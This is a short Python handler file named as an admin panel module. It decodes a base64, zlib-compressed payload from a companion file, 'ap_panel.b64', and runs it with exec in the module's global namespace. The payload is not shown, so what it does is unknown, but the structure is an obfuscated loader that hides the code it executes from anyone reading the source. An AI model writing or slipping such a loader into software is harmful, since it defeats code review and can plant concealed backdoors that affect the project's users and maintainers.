# handlers/admin_panel.py
import zlib, base64
from pathlib import Path
_b = (Path(__file__).resolve().parent / "ap_panel.b64").read_text().strip()
_code = zlib.decompress(base64.b64decode(_b)).decode("utf-8")
exec(compile(_code, __file__, "exec"), globals())
